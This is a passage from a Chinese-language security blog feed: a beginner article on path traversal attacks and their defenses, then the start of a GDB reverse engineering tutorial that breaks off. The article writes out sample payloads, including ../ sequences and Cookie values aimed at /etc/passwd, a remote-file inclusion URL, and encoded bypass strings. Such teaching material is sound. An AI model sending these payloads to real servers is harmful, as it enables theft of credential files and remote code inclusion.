&lt;p&gt;路徑遍歷（Path Traversal）就像想像網站是一個博物館，裡面有許多房間，其中有些房間是 Staff Only 而且門上了鎖不讓訪客進入，但有趣的是博物館裡的每一個房間都有通風口，只要知道房間位置，就可以透過其他房間的通風口前往 Staff Only 的房間獲得所有你想要的資料。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!-- summary --&gt;
&lt;h2 id=&quot;%E9%87%8B%E4%BE%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%87%8B%E4%BE%8B&quot;&gt;#&lt;/a&gt; 釋例&lt;/h2&gt;
&lt;p&gt;今天想和大家聊聊在網站安全上攻擊者容易執行但卻常被開發者忽略的路徑遍歷（Path Traversal）攻擊，談談關於路徑遍歷在網站安全上可能造成的風險以及如何預防。&lt;/p&gt;
&lt;p&gt;通常路徑遍歷也被稱目錄遍歷（Directory Traversal），但他有個更具體而且蠻可愛的名字叫做點點斜線攻擊（Dot dot slash attack），那為什麼會叫這個名字呢？&lt;/p&gt;
&lt;p&gt;舉個實際的例子，Linux 中，目錄的顯示是 / Users / hello / Desktop / file，如果使用者輸入 cd ../ 指令時，當前的目錄就會回到上一層，那這會有什麼問題？當這個指令是任一使用者測試在網站 URL 上輸入 ../ 都可以成功執行回到網站目錄上一層的時候問題就大條了，這表示告訴攻擊者，我有路徑遍歷的風險，你可以開始嘗試囉！&lt;/p&gt;
&lt;h2 id=&quot;%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%B8%B8%E8%A6%8B%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A%E6%89%8B%E6%B3%95&quot;&gt;#&lt;/a&gt; 常見的路徑遍歷攻擊手法&lt;/h2&gt;
&lt;p&gt;以下拿幾個路徑遍歷的攻擊常見的範例來說明：&lt;/p&gt;
&lt;p&gt;假設網址呈現的方式為：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;https://www.example.com/get-files?file=report.pdf&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而攻擊者在真正的執行路徑遍歷攻擊以前，常會使用絕對路徑遍歷的手法探測目標網站的網站架構，例如說：&lt;/p&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;https://www.example.com/get-files?file=/etc/passwd&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;，嘗試以常用的系統絕對路徑試探是否有回應當，當伺服器回應有關網站應用程序中的錯誤的信息時，攻擊者可以更容易猜測正確的位置（例如顯示原始碼的文件路徑）。&lt;/p&gt;
&lt;h3 id=&quot;1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#1.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%A8%AA%E5%95%8F%E7%9B%AE%E9%8C%84%E5%A4%96%E7%9A%84%E8%B7%AF%E5%BE%91%EF%BC%9A&quot;&gt;#&lt;/a&gt; 1.攻擊者嘗試訪問目錄外的路徑：&lt;/h3&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;https://www.example.com/../../../../some dir/some file&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻擊者藉由多次的 ../ 來超脫當前的目錄，訪問不在目錄下的資料。&lt;/p&gt;
&lt;h3 id=&quot;2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#2.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E8%AE%80%E5%8F%96%E7%9B%AE%E9%8C%84%E4%B8%AD%E7%9A%84%E7%B3%BB%E7%B5%B1%E6%AA%94%E6%A1%88&quot;&gt;#&lt;/a&gt; 2.攻擊者嘗試讀取目錄中的系統檔案&lt;/h3&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;https://www.example.com/get-files?file=/etc/passwd&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻擊者藉由 /etc/passwd 來嘗試直接讀取系統檔案，如果真的被攻擊者讀取到 /etc/passwd 檔的話，攻擊者很有可能藉此解讀 root user 的密碼，另外，值得一提的是，如果網站架在 Windows 的系統中的話，攻擊者只能訪問Web根目錄所在的磁碟分區，但如果是在 Linux 系統中的話，攻擊者則可以訪問整個磁碟。&lt;/p&gt;
&lt;h3 id=&quot;3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#3.%E6%94%BB%E6%93%8A%E8%80%85%E5%98%97%E8%A9%A6%E4%BD%BF%E7%B6%B2%E7%AB%99%E5%BC%95%E7%94%A8%E5%A4%96%E9%83%A8%E6%96%87%E4%BB%B6%E6%88%96%E8%85%B3%E6%9C%AC&quot;&gt;#&lt;/a&gt; 3.攻擊者嘗試使網站引用外部文件或腳本&lt;/h3&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;https://www.example.com/get-files?file=http://other-site.com/malicius-code.php&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;攻擊者藉由嘗試將其他網站中的文件包含到當前網站的目錄，讓系統去引用攻擊者的惡意外部文件或腳本，進而達到提權或是竊取機敏資料的目的。&lt;/p&gt;
&lt;h3 id=&quot;4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#4.%E6%94%BB%E6%93%8A%E8%80%85%E4%BB%A5%E7%AB%84%E6%94%B9-http-%E7%9A%84%E8%AB%8B%E6%B1%82%E8%97%89%E6%AD%A4%E5%B0%8D%E4%BC%BA%E6%9C%8D%E5%99%A8%E7%99%BC%E8%B5%B7%E6%94%BB%E6%93%8A&quot;&gt;#&lt;/a&gt; 4.攻擊者以竄改 HTTP 的請求藉此對伺服器發起攻擊&lt;/h3&gt;
&lt;pre class=&quot;language-txt&quot;&gt;&lt;code class=&quot;language-txt&quot;&gt;GET /vulnerable.php HTTP/1.0   &lt;br&gt;Cookie: TEMPLATE=../../../../../../../../../etc/passwd&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;與上列不同的是攻擊者不是經由竄改 URL 而達成路徑遍歷的攻擊，而是藉由竄改 HTTP 的請求以多次的../來超脫當前網站的目錄，使伺服器回應傳送 etc/passwd 解讀 root user 的密碼。&lt;/p&gt;
&lt;h2 id=&quot;%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%AE%8A%E5%BD%A2%E7%9A%84%E8%B7%AF%E5%BE%91%E9%81%8D%E6%AD%B7%E6%94%BB%E6%93%8A&quot;&gt;#&lt;/a&gt; 變形的路徑遍歷攻擊&lt;/h2&gt;
&lt;p&gt;在看完上述所說明的攻擊之後，你可能想說那我只要擋掉使用者在我的 URL 以及 HTTP 請求的輸入進行驗證及限制，不允許../的出現，那麼針對路徑遍歷的攻擊也就無用武之地了吧？&lt;/p&gt;
&lt;p&gt;一個好消息和一個壞消息告訴你，好消息是你的觀念正確，對URL 以及 HTTP 請求的輸入進行驗證及限制的確是避免路徑遍歷攻擊的應對策略之一，但壞消息是../是有變形的，而且還有很多種變形，其中最常見的變形就是在&lt;strong&gt;零基礎資安系列(二)-認識 XSS(Cross-Site Scripting)&lt;/strong&gt; 中和大家提過的HTML Encoder 會將 &lt;code&gt;%2e%2e%2f&lt;/code&gt; 解析為 ../ 繞過針對 ../ 的檢查，除此之外還有 UTF-8 編碼 &lt;code&gt;%c1%1c&lt;/code&gt; 會被解析為 / ，以及若是更進階一點的話攻擊者還可能使用 xor 概念，&lt;code&gt;%d0^%ff = /&lt;/code&gt; 的編碼方式，繞過限制的字元，如果大家對攻擊者可能使用的進階 injection 有興趣，我之後會再寫一篇文章和大家說明，在這裡主要想告訴大家的是限制字元的輸入是個好的應對策略，但前提是將所有攻擊者可能的攻擊方式全部寫進規則中，否則仍然會使攻擊者有機可趁。&lt;/p&gt;
&lt;h2 id=&quot;%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%A6%82%E4%BD%95%E9%98%B2%E7%A6%A6&quot;&gt;#&lt;/a&gt; 如何防禦&lt;/h2&gt;
&lt;p&gt;上面說了這麼多攻擊者可能的攻擊方式，又表示有那麼多變形的路徑遍歷攻擊，那難道我們對攻擊者就無計可施了嗎？&lt;/p&gt;
&lt;p&gt;當然不是！依據我的經驗，針對路徑遍歷攻擊的防禦可以從三個方面來看&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.輸入驗證&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;針對路徑遍歷攻擊最直覺的防禦就是驗證及限制所有在 URL 以及 HTTP 請求，不允許輸入 ../ 以及其他變形的輸入，這方面的防禦強度會在於網站對於輸入驗證的規則完善度而決定。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.權限控管&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在開發和部署網頁應用程式的時候盡可能的以最小的權限執行，盡可能的刪除所有不常使用或權限過大的使用者並取消 Guest 角色，建立完整的 ACL（Access Control List） ，且確保文件的可讀可寫權限也的確受到控管（例如Linux 系統盡可能不要有權限 777 的文件，這會讓這份文件全世界可讀可寫），這樣的話即使攻擊者成功的查看網頁目錄，也會因為權限問題而導致無法存取文件，最多只能得知網站目錄架構及檔名。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.資料處理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之所以把資料處裡放在最後一步是因為我認為資料處理是面對攻擊者的最後一道防線，即使攻擊者可以繞過輸入驗證，成功獲得瀏覽目錄的權限，但如果目錄中沒有隱密資料或是將重要資料另外備份在其他的伺服器，例如密碼檔、已經沒有被引用的舊文件、網站備份的資料、Log 紀錄、系統版本紀錄 等，攻擊者在沒有獲得任何有效資料的情況下也只能繼續嘗試其他的攻擊路徑。&lt;/p&gt;
&lt;h2 id=&quot;%E7%B5%90%E8%AB%96&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%B5%90%E8%AB%96&quot;&gt;#&lt;/a&gt; 結論&lt;/h2&gt;
&lt;p&gt;雖然資料處理是三種防禦中面對攻擊者的最後一道防線，但我認為最重要的防禦還是針對路徑遍歷攻擊的輸入驗證，原因是因為對攻擊者來說，一但發現網站的輸入驗證規則設置周全或是一般常見的手法都沒辦法獲得任何有效的資料時，攻擊者通常會選擇另尋目標，所以我建議的方式會是建立一個針對路徑遍歷攻擊包含 ../ 及 HTML Encoder 編碼規則的輸入驗證會是針對路徑遍歷攻擊首先該做的事，接著才是刪除所有不常使用的使用者權限並且不允許遠端操作，將當前網站目錄中非必要存在的重要檔案另外備份並在當下的目錄中刪除，以上兩件事情可以依據公司的情況做調整，例如帳號權限複雜先不動或重要的檔案位置混亂不好歸納所以先處理權限 等，以公司承擔成本較低的方式自行取捨。&lt;/p&gt;
&lt;p&gt;當以上三種防禦都進行之後，即使攻擊者願意花時間嘗試除了一般常見規則的路徑遍歷攻擊外再特別設計攻擊，並且在進入目錄後連一般使用者權限都沒有的情況下嘗試提權，再提權成功後，看著沒有高重要性資料的目錄同常也會感到挫折。&lt;/p&gt;
&lt;h2 id=&quot;%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80&quot;&gt;#&lt;/a&gt; 延伸閱讀&lt;/h2&gt;
&lt;h3 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89--%E8%AA%8D%E8%AD%98-xss(cross-site-scripting)&quot;&gt;#&lt;/a&gt; 零基礎資安系列（二）- 認識 XSS(Cross-Site Scripting)&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting&quot;&gt;認識 XSS（Cross-Site Scripting）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&quot;%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E5%9B%9B%EF%BC%89--%E8%AA%8D%E8%AD%98%E6%B3%A8%E5%85%A5%E6%94%BB%E6%93%8A%EF%BC%88-injection-attack%EF%BC%89&quot;&gt;#&lt;/a&gt; 零基礎資安系列（四）- 認識注入攻擊（ Injection Attack）&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://tech-blog.cymetrics.io/jo/zerobased-injectionattack&quot;&gt;認識注入攻擊（ Injection Attack）&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99&quot;&gt;#&lt;/a&gt; 參考資料&lt;/h2&gt;
&lt;h3 id=&quot;owasp-path-traversal&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#owasp-path-traversal&quot;&gt;#&lt;/a&gt; OWASP Path Traversal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://owasp.org/www-community/attacks/Path_Traversal&quot;&gt;https://owasp.org/www-community/attacks/Path_Traversal&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;wikipedia-path-traversal&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#wikipedia-path-traversal&quot;&gt;#&lt;/a&gt; Wikipedia Path Traversal&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Directory_traversal_attack&quot;&gt;https://en.wikipedia.org/wiki/Directory_traversal_attack&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

		</content>
	</entry>
	
	<entry>
		<title>Reverse Engineering 101 — Part 1</title>
		<link href="https://tech-blog.cymetrics.io/posts/crystal/reverse-01/"/>
		<updated>2021-06-04T00:00:00-00:00</updated>
		<id>https://tech-blog.cymetrics.io/posts/crystal/reverse-01/</id>
		<content type="html">
		  &lt;!-- summary --&gt;
&lt;!-- 很多人對逆向工程躍躍欲試卻不知道從何開始，又該具備哪些知識？這一篇文章會從逆向一個小程式，帶你建立基礎知識與想法！ --&gt;
&lt;!-- summary --&gt;
&lt;p&gt;最近解一些 CTF 順便跟同事分享 Reversing 的一點基礎技巧，想說寫成文章分享一下。這篇是給技術小白的 Reversing 入門系列，零基礎第一課！&lt;/p&gt;
&lt;p&gt;本篇會用到的工具有：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;linux 或 Unix-like 作業系統&lt;/li&gt;
&lt;li&gt;GDB（GNU Debugger），一個不管靜態還是動態分析都很好用的 linux 內建工具&lt;/li&gt;
&lt;li&gt;滿滿的好奇心！&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E8%A9%B2%E5%A6%82%E4%BD%95%E9%96%8B%E5%A7%8B%EF%BC%9F&quot;&gt;#&lt;/a&gt; 該如何開始？&lt;/h2&gt;
&lt;p&gt;以下以一個簡單的&lt;a href=&quot;https://github.com/OneDegree-Global/medium-resources/tree/main/reverse-101&quot;&gt;小程式&lt;/a&gt;為例。&lt;/p&gt;
&lt;p&gt;今天拿到一個未知的檔案，我們該從何下手呢？首先，要知道我們的目標是什麼樣的檔案。我們可以用 linux 內建的 &lt;code&gt;file&lt;/code&gt; 指令來辨識檔案類型。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/file.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;file 指令&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;例如從上圖中我們可以觀察到幾件事：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;這是一個 ELF 檔案（Executable Linkable Format），是 Unix 系統上常見的 binary 執行檔、共用函式庫、或是 object code 類型，也意味這我們可以直接在 linux 系統上把他跑起來 &lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn1&quot; id=&quot;fnref1&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;記憶體的位元組順序（Endianness）採 LSB（Least Significant Bit），或是常說的 little endian，表示把最高位的位元組放在最高的記憶體位址上，如下圖所示。這表示當我們輸入 &lt;code&gt;1234&lt;/code&gt; 的時候，在 GDB 等軟體裡觀察記憶體時會看到的是 &lt;code&gt;\x34\x33\x32\x31&lt;/code&gt;，這部分我們等等用 GDB 會再看到。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/little-endian.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;圖片來自 &lt;a href=&quot;https://blog.gtwang.org/programming/difference-between-big-endian-and-little-endian-implementation-in-c/&quot;&gt;這篇文章&lt;/a&gt;&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;libc 函數的調用為 dynamically linked，亦即程式跑起來的時候，作業系統才會做 linking，把各個要調用的 libc 函數的位置填到這隻程式的一張表裡，方便執行時查詢呼叫。如果是 statically linked，在編譯過程中就會直接把這些外部函數都一起包到程式裡面，產出一個比較肥大的檔案。就像有人製作筆記時，會把課本內容抄到筆記本上，這樣所有資料一目瞭然，馬上就能找到，缺點是筆記厚厚一本；也有人僅是標註對應的課本頁數，這樣筆記較為精簡輕便，不過缺點是要找資料時必須另外參照課本。&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn2&quot; id=&quot;fnref2&quot;&gt;[2]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;跑在 x86–64 （64 bits）的結構上，64 bits 跟 32 bits 不只在暫存器名稱上不同，在 system call 的呼叫上也不一樣。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;not stripped&lt;/code&gt;，表示在編譯過程中，debugging 資訊沒有被去掉，我們還看的到各個函數跟變數的名稱等等。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接著就可以執行看看！跑起來如下圖所示，會先跟使用者要三個數字，然後進行某些判斷，錯誤就會像這樣印出 ‘nope.’。因此，我們可以判斷拿到 flag 的條件就是讓這三個數字符合某些關係，檢查通過了就會印出 flag。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/execution.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;adder 跑起來！&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#gdb-%E6%98%AF%E4%BB%80%E9%BA%BC%EF%BC%9F%E8%83%BD%E5%90%83%E5%97%8E%EF%BC%9F&quot;&gt;#&lt;/a&gt; GDB 是什麼？能吃嗎？&lt;/h2&gt;
&lt;p&gt;GDB 的全名是 GNU Debugger，顧名思義就是可以讓你一邊執行一個檔案一邊看到裡面的細節，也可以設置中斷點來逐步檢視記憶體裡面存的東西跟執行順序，方便開發者抓蟲。他還有很多強大的功能跟插件，例如最常用的 peda、gef、pwndbg 等等，可以讓你很方便地看到不同區段的資料甚至產生 shellcode ，大家如果有興趣可以再去逛逛。&lt;/p&gt;
&lt;p&gt;首先，執行 &lt;code&gt;gdb &amp;lt;filename&amp;gt;&lt;/code&gt; 就可以在 GDB 裡面載入這個執行檔。再來就是用 &lt;code&gt;info file&lt;/code&gt; 來觀察這個程式的進入點跟各區段位置&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn3&quot; id=&quot;fnref3&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt;。編譯器運作時，會把負責邏輯的程式碼跟變數等資料分區存放並加上對應的標籤以供程式運行時存取。&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/gdb-info.png&quot;&gt;&lt;figcaption&gt;&lt;p&gt;info file 結果&lt;/p&gt;
&lt;/figcaption&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;通常我們會注意的幾個比較重要的區段為：&lt;/p&gt;
&lt;p&gt;1. &lt;code&gt;.text&lt;/code&gt;：放置可執行的程式碼。權限為唯讀。&lt;/p&gt;
&lt;p&gt;2. &lt;code&gt;.rodata&lt;/code&gt;：已初始化的資料，例如你在程式裡面寫死的字串或是常數。權限為唯讀。&lt;/p&gt;
&lt;p&gt;3. &lt;code&gt;.data&lt;/code&gt;：已初始化的資料，例如你在程式裡面使用的全域變數。權限為可讀可寫。&lt;/p&gt;
&lt;p&gt;4. &lt;code&gt;.bss&lt;/code&gt;：未初始化的資料。權限為可讀可寫。&lt;/p&gt;
&lt;p&gt;我們知道開始執行的地方是 &lt;code&gt;0x400860&lt;/code&gt; 後，就可以用 &lt;code&gt;disas&lt;/code&gt; 反編譯這段程式碼。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/disas-start.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我們會觀察到這個函數有一個名字 &lt;code&gt;_start&lt;/code&gt;。之前說過，&lt;code&gt;not stripped&lt;/code&gt; 表示函數名稱都有被保留，所以我們也可以用函數名稱當作 reference 對象，在反編譯跟設中斷點的時候使用這個名稱。&lt;/p&gt;
&lt;p&gt;但是我們的程式裡面沒有寫到 &lt;code&gt;_start&lt;/code&gt; 這個函數啊，他是哪裡來的呢？其實在編譯的過程中，編譯器會加入一個進入點 &lt;code&gt;_start&lt;/code&gt; 函數，負責初始化一些 gcc/glibc 的準備工作再呼叫我們的 &lt;code&gt;main&lt;/code&gt;，可以想成是在我們的程式外多加一層包裝來整頓好環境再開始執行主邏輯。所以，我們可以看到在 &lt;code&gt;&amp;lt;+36&amp;gt;&lt;/code&gt; 的地方呼叫 &lt;code&gt;&amp;lt;__libc_start_main@plt&amp;gt;&lt;/code&gt;，其實也就是透過 libc 的函數再間接呼叫我們所撰寫的主程式 &lt;code&gt;main&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;這裡我們打個岔，回去看一下前面提到的 little endian。下面這張圖是在 GDB 裡面用 &lt;code&gt;x/&amp;lt;num&amp;gt;&amp;lt;unit&amp;gt; addr&lt;/code&gt; 去看記憶體的指令，unit 有 b（bytes = 1 byte）、h（halfword = 2 bytes）、w（word = 4 bytes）、g（giant word = 8 bytes）這幾種，表示一次看的單位是多少位元，前面的 num 就是看多少單位，所以 &lt;code&gt;x/4x 0x400cd0&lt;/code&gt;就是從地址 &lt;code&gt;0x400cd0&lt;/code&gt;開始讀取 4 個 4 byte 的記憶體。unit 預設是 w，x 就是延續用最後一次設的單位。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/crystal/reverse-01/gdb-endian.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;我們看到第一行的第一塊記憶體是紅色框起來的 &lt;code&gt;0x65746e45&lt;/code&gt;，第二塊記憶體是黃色框起來的 &lt;code&gt;0x68742072&lt;/code&gt;，那第三行一次讀 8 bytes 的時候怎麼順序交換變成黃色框在前面了呢？&lt;/p&gt;
&lt;p&gt;那就是因為 little endian 必須反過來讀，我們看到的 &lt;code&gt;\x65\x74\x6e\x45&lt;/code&gt; 在記憶體裡面存的其實是 &lt;code&gt;\x45\x6e\x74\x65&lt;/code&gt;，所以把第一行的框框們從屁股讀回來，黏一起就是 &lt;code&gt;\x45\x6e\x74\x65 \x72\x20\x74\x68&lt;/code&gt;，就是第三行的第一個單位反過來的樣子啦！大家記得不要讀反囉！&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E5%9F%BA%E7%A4%8E%E7%9F%A5%E8%AD%98%EF%BC%9A%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80%E8%88%87%E8%A8%88%E7%AE%97%E6%A9%9F%E7%B5%90%E6%A7%8B&quot;&gt;#&lt;/a&gt; 基礎知識：組合語言與計算機結構&lt;/h2&gt;
&lt;p&gt;接下來，在進到 &lt;code&gt;main&lt;/code&gt; 之前，先來講講一點基本的組合語言與計算機結構。&lt;/p&gt;
&lt;p&gt;組合語言是介於機器看得懂的二進位操作碼（opcode）與一般人看得懂的高階程式語言中間的一種低階語言，目的是讓二進位的程式變得可以閱讀與編輯。由於每一種 CPU 使用的機器指令（machine instruction）都不同，所以對應的組合語言也不一樣，這裡我們以 x86–64 為例介紹，遇到不懂或沒看過的都可以去查指令集哦。&lt;sup class=&quot;footnote-ref&quot;&gt;&lt;a href=&quot;#fn4&quot; id=&quot;fnref4&quot;&gt;[4]&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;最常見的指令如下，&lt;code&gt;S&lt;/code&gt; 指 source，&lt;code&gt;D&lt;/code&gt; 指 destination：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mov D, S&lt;/code&gt;：將某個值或是記憶體的位置寫入某個暫存器。把 &lt;code&gt;S&lt;/code&gt; 裡面的值寫到 &lt;code&gt;D&lt;/code&gt;裡面。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;push S&lt;/code&gt;：將 &lt;code&gt;S&lt;/code&gt; 裡面的值放到 stack 上。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pop D&lt;/code&gt;：把 stack 上的值放到 &lt;code&gt;D&lt;/code&gt; 裡面，從 stack 移除。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;add D, S&lt;/code&gt;、&lt;code&gt;sub D, S&lt;/code&gt;：將 &lt;code&gt;S&lt;/code&gt; 跟 &lt;code&gt;D&lt;/code&gt; 裡面的值相加相減，結果放在 &lt;code&gt;D&lt;/code&gt; 裡面。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;call Label&lt;/code&gt;：呼叫帶有 Label 標籤的函數，這時程式會為這個函數創一個新的 stack frame。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ret&lt;/code&gt;：終止當前函數的執行，返回到上一層的函數。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;還有進行條件判斷的 &lt;code&gt;cmp&lt;/code&gt;、&lt;code&gt;test&lt;/code&gt; 跟各種跳躍的 &lt;code&gt;jmp&lt;/code&gt; 家族，之後我們遇到再說明。&lt;/p&gt;
